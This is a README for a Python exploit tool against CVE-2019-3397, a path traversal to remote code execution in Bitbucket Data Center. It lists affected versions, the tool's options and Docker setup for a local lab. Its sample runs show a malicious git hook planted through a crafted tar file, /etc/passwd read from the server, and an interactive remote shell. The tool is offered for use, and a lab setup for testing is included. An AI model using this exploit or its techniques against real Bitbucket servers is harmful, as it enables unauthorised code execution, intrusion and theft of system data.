# BitBucket Tar\\../ersal to Remote Code Execution - CVE-2019-3397

## Description
Atlassian Bitbucket Data Center licensed instances starting with version 5.13.0 before 5.13.6 (the fixed version for 5.13.x), from 5.14.0 before 5.14.4 (fixed version for 5.14.x), from 5.15.0 before 5.15.3 (fixed version for 5.15.x), from 5.16.0 before 5.16.3 (fixed version for 5.16.x), from 6.0.0 before 6.0.3 (fixed version for 6.0.x), and from 6.1.0 before 6.1.2 (the fixed version for 6.1.x) allow remote attackers who have admin permissions to achieve remote code execution on a Bitbucket server instance via path traversal through the Data Center migration tool.

## Tested On
- BitBucket Data Center v5.15.0
- BitBucket Data Center v6.1.1

## Usage

### Required arguments
- \-\-target/-t - URL of the target BitBucket Data Center instance
- \-\- project/-pr - BitBucket project key of the repository
- \-\- repository/-rp - BitBucket repository name

```bash
$ ./bitbucket-tarversal.py --help

usage: bitbucket-tarversal.py [-h] [--target TARGET] [--project PROJECT]
                              [--repository REPOSITORY] [--command COMMAND]
                              [--target-project TARGET_PROJECT]
                              [--target-repository TARGET_REPOSITORY]
                              [--username USERNAME] [--password PASSWORD]
                              [--insecure]

Bitbucket Path Traversal to RCE - CVE-2019-3397

optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        URL of the target BitBucket Data Center instance e.g.
                        http(s)://localhost:7990
  --project PROJECT, -pr PROJECT
                        BitBucket project key of the repository you want to 
                        attach the malicious tar file to.
  --repository REPOSITORY, -rp REPOSITORY
                        BitBucket repository name of the repository you 
                        want to attach the malicious tar file to.
  --target-project TARGET_PROJECT, -tp TARGET_PROJECT
                        BitBucket project key of the target repository to
                        inject the malicious git hook. If omitted, the value 
                        specified in --project/-pr will be used.
  --target-repository TARGET_REPOSITORY, -tr TARGET_REPOSITORY
                        BitBucket repository name of the target repository to
                        inject the malicious git hook. If omitted, the value 
                        specified in --repository/-rp will be used.
  --command COMMAND, -c COMMAND
                        Shell command to execute. If ommitted, it will be 
                        asked in prompt.
  --username USERNAME, -u USERNAME
                        BitBucket username. If not supplied, it will be asked
                        in prompt.
  --password PASSWORD, -p PASSWORD
                        BitBucket password. If not supplied, it will be asked
                        in prompt.
  --insecure, -k        Do not verify SSL certificate. Turn on this option 
                        when the SSL certificate of the remote host is not valid.
  --interactive, -i     Spawn an interactive shell.
```

### Sample usage and output
#### Single Command
```bash
$ ./bitbucket-tarversal.py --target http://localhost:7990 \
--project PRJ1 --repository REPO1
BitBucket username: admin
BitBucket password:
[+] Logging in...Success!
Enter your shell command
$ cat /etc/passwd
[+] Generating a malicious tar file
    [+] Preparing git hooks
        [+] Fetching target repository details
    [+] Full path is ../../31/hooks/pre-receive
    [+] Injecting malicious git hook to the tar file
[+] Importing the malicious tar file as attachment to BitBucket
    [+] Uploading tar as an attachment...Success! The tar file is located at ../../attachments/repository/31/4f8c4574db/import_tmp.tar
    [+] Calling the import REST API...Success!
[+] Triggerring a git push event
    [+] Cloning PRJ1/REPO1
    [+] Committing an empty commit
    [+] Pushing the commit. You should be able to see any output from the shell command below.
remote: root:x:0:0:root:/root:/bin/bash
remote: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
remote: bin:x:2:2:bin:/bin:/usr/sbin/nologin
remote: sys:x:3:3:sys:/dev:/usr/sbin/nologin
remote: sync:x:4:65534:sync:/bin:/bin/sync
remote: games:x:5:60:games:/usr/games:/usr/sbin/nologin
remote: man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
remote: lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
remote: mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
remote: news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
remote: uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
remote: proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
remote: www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
remote: backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
remote: list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                    
remote: irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                 
remote: gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
remote: nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                       
remote: systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin                                                                              
remote: systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin                                                                                      
remote: _apt:x:102:65534::/nonexistent:/usr/sbin/nologin
remote: systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin                                                                                 
remote: Debian-exim:x:104:110::/var/spool/exim4:/usr/sbin/nologin                        
remote: messagebus:x:105:111::/nonexistent:/usr/sbin/nologin                             
remote: postgres:x:106:114:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash     
remote: atlbitbucket:x:1000:1000:Atlassian Bitbucket:/var/atlassian/application-data/bitbucket:/bin/sh                                                                            
[+] Cleaning up  
```

#### Interactive
```bash
$ ./bitbucket-tarversal.py --target http://localhost:7990 \
--project PRJ1 --repository REPO1 --interactive
BitBucket username: admin
BitBucket password:
$ whoami
remote: atlbitbucket
$ ifconfig
remote: eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
remote:         inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
remote:         ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet) remote: RX packets 1484  bytes 1145416 (1.0 MiB)
remote:         RX errors 0  dropped 0  overruns 0  frame 0
remote:         TX packets 1353  bytes 532981 (520.4 KiB)
remote:         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
remote:
remote: lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
remote:         inet 127.0.0.1  netmask 255.0.0.0
remote:         loop  txqueuelen 1  (Local Loopback)
remote:         RX packets 1350  bytes 183940 (179.6 KiB)
remote:         RX errors 0  dropped 0  overruns 0  frame 0
remote:         TX packets 1350  bytes 183940 (179.6 KiB)
remote:         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
remote:
$ exit
[+] Exiting...
```

## Resources
- [Bitbucket 6.1.1 Path Traversal to RCE](https://blog.ripstech.com/2019/bitbucket-path-traversal-to-rce/)
- [CVE-2019-3397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3397)
- [Demo Video](https://youtu.be/2Y8iYTu4kV0)

## Testing with Docker

1. Pull BitBucket docker image: `docker pull atlassian/bitbucket:6.1.1`.
2. Run BitBucket server: `docker run --mount source=bitbucketVolume,target=/var/atlassian/application-data/bitbucket --name="bitbucket" -d -p 7990:7990 -p 7999:7999 atlassian/bitbucket:6.1.1`.
3. Access BitBucket on `http://localhost:7990/`.
4. Set up BitBucket and choose to install BitBucket for evaluation. This step requires a BitBucket account.
5. Continue to set up an administrator account.
6. Create a project and a repository under that project. Take note of the project and repository keys.
7. Run `bitbucket-tarversal.py`.
8. ???
9. Profit.
